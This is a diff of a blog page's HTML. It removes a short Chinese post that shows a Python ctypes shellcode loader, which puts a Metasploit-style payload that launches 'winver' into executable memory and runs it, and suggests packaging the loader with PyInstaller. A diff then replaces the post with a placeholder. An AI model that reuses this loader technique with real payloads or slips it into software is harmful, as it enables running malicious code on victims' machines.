@@ -19,84 +19,25 @@
     	</ul>
     </div>
 	<div class="wrap-header">
-	<h1>
+    <h1>
     <a href="/" id="title"></a>
-	</h1>
+    </h1>
 	</div>
 <xmp id="md" style="display: none;">
 <!-- markdown -->
-python 方式, 当然 c++ 更好写.
-
-弹 `winver` 的 payload
-
-```
-#!/usr/bin/python
-import ctypes
-
-shellcode = b""
-shellcode = shellcode  + b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
-shellcode = shellcode  + b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
-shellcode = shellcode  + b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
-shellcode = shellcode  + b"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
-shellcode = shellcode  + b"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
-shellcode = shellcode  + b"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
-shellcode = shellcode  + b"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
-shellcode = shellcode  + b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
-shellcode = shellcode  + b"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
-shellcode = shellcode  + b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
-shellcode = shellcode  + b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56"
-shellcode = shellcode  + b"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
-shellcode = shellcode  + b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x77\x69\x6e\x76"
-shellcode = shellcode  + b"\x65\x72\x00"
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x4000),ctypes.c_int(0x40))
-buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-```
-
-之后可以用 Py2exe Pyinstaller 之类的工具打包
+占坑.
 <!-- markdown end -->
 </xmp>
 <div class="entry" id="main">
 <!-- content -->
-<p>python 方式, 当然 c++ 更好写.</p>
-
-<p>弹 <code>winver</code> 的 payload</p>
-
-<pre><code>#!/usr/bin/python
-import ctypes
-
-shellcode = b""
-shellcode = shellcode  + b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
-shellcode = shellcode  + b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
-shellcode = shellcode  + b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
-shellcode = shellcode  + b"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
-shellcode = shellcode  + b"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
-shellcode = shellcode  + b"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
-shellcode = shellcode  + b"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
-shellcode = shellcode  + b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
-shellcode = shellcode  + b"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
-shellcode = shellcode  + b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
-shellcode = shellcode  + b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56"
-shellcode = shellcode  + b"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
-shellcode = shellcode  + b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x77\x69\x6e\x76"
-shellcode = shellcode  + b"\x65\x72\x00"
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x4000),ctypes.c_int(0x40))
-buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-</code></pre>
-
-<p>之后可以用 Py2exe Pyinstaller 之类的工具打包</p>
+<p>占坑.</p>
 <!-- content end -->
 </div>
 <br>
 <br>
     <div id="disqus_thread"></div>
 	<div class="footer">
-		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+		<p>© Copyright 2017-2019 by X1r0z</p>
 	</div>
 </div>
 <script src="main.js"></script>
